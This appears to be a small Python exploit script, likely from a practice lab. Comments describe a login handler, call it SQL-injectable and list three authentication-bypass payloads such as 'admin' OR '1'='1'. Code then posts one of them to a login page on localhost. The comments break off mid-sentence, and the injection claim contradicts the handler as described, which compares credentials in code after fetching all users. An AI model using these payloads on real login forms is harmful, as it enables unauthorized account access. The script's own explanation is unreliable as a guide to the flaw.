
#
#1. It is taking the username and password from the request.
#2. It is connecting to the database.
#3. It is executing a query to get all the users from the database.
#4. It is iterating through the results and checking if the username and password match.
#5. If they match, it is redirecting the user to the next page.
#6. If they don't match, it is returning an error message.
#7. It is closing the database connection.
#
#The above code is vulnerable to SQL injection.
#
#The following payload will log in the user:
#
#username: admin' --
#password: anything
#
#The following payload will log in the user:
#
#username: admin' OR '1'='1
#password: anything
#
#The following payload will log in the user:
#
#username: admin' OR '1'='1' --
#password: anything
#
#The following payload

import requests

url = "http://localhost:5000/login"

payload = {'username': "admin' OR '1'='1", 'password': "anything"}
r = requests.post(url, data=payload)

print(r.text)